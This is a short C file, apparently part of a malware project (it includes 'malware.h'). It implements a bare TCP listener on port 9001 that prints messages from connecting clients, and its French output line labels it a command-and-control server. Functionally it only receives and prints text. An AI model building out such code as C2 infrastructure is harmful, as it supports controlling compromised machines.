#include "malware.h"

#define PORT 9001

int main()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    struct sockaddr_in addr = {AF_INET, htons(PORT), INADDR_ANY};
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) exit(1);

    listen(sockfd, 5);
    printf("C2 en écoute sur %d...\n", PORT);

    while (1) {
        int newsockfd = accept(sockfd, NULL, NULL);
        if (newsockfd < 0) continue;

        char buffer[256] = {0};
        int n = read(newsockfd, buffer, sizeof(buffer) - 1);
        if (n > 0) printf("Message : %s", buffer);

        close(newsockfd);
    }
}
